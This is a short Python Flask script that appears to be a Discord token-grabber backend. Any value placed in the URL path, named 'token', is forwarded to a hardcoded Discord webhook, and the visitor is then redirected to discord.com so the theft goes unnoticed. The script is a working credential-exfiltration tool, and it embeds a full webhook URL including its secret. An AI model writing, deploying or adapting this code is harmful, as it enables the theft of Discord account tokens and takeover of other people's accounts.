from dhooks import Webhook
from flask import Flask, redirect
e = "https://discord.com/api/webhooks/1438006724714958868/jsBVkOjC9WYdX8H2_lzGO5ydXOAhVbwZVun-Te36YWtvY5w4ZzNsICvXSWpsd3Y-ek_2"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
